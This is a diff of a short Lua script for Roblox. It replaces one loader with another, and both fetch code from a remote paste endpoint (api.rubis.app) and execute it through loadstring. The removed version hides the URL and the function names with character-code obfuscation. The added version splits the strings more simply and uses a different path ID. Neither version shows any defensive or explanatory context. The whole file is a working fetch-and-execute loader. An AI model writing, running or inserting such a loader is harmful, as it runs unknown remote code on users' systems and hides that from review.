@@ -1,22 +1,10 @@
-(function()
-    local _a = string.char
-    local _b = table.concat
-    local _c = {"h","t","t","p","s",":","/","/","a","p","i",".","r","u","b","i","s",".","a","p","p","/","v","2","/","s","c","r","a","p","/","I","p","f","I","i","4","R","i","H","i","l","e","6","T","H","X","/","r","a","w"}
-    local _d = ""
-    for i = 1, #_c do _d = _d .. _c[i] end
-
-    local _e = game
-    local _f = _a(72).._a(116).._a(116).._a(112).._a(71).._a(101).._a(116)
-    local _g = _e[_f]
-    local _h = (_a(108).._a(111).._a(97).._a(100).._a(115).._a(116).._a(114).._a(105).._a(110).._a(103))
-    local _i = getfenv and getfenv(1) or _ENV
-    local _j = _i[_h]
-
-    local function __layer1(fn) return function(...) return fn(...) end end
-    local function __layer2(f) return __layer1(f) end
-
-    __layer2(function()
-        local resp = _g(_e, _d, true)
-        _j(resp)()
-    end)()
-end)()
+local a = "ht" .. "tps://" .. "api.rubis.app"
+local b = "/v2" .. "/scrap/"
+local c = "RLnYkvQrpdxwKmtX"
+local d = "/raw"
+local e = a .. b .. c .. d
+local f = game
+local g = f:HttpGet(e, true)
+local h = loadstring
+local i = h(g)
+i()
